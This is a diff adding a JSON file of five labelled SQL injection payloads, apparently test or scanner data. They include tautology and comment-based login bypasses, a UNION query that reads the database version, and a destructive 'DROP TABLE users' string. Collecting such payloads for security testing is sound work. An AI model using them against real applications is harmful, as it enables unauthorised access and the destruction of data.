@@ -1,0 +1,32 @@
+[
+    {
+        "id": "sqli_basic_or1",
+        "type": "sqli",
+        "payload": "' OR '1'='1",
+        "description": "Basic tautology-based SQLi"
+    },
+    {
+        "id": "sqli_comment",
+        "type": "sqli",
+        "payload": "' OR 1=1 -- ",
+        "description": "Basic SQLi with inline comment"
+    },
+    {
+        "id": "sqli_union_version",
+        "type": "sqli",
+        "payload": "' UNION SELECT null, version() -- ",
+        "description": "Union-based SQLi to get DB version"
+    },
+    {
+        "id": "sqli_drop_table",
+        "type": "sqli",
+        "payload": "'; DROP TABLE users --",
+        "description": "SQLi to drop a table (destructive)"
+    },
+    {
+        "id": "sqli_admin_bypass",
+        "type": "sqli",
+        "payload": "admin' -- ",
+        "description": "Bypass login using admin user"
+    }
+]
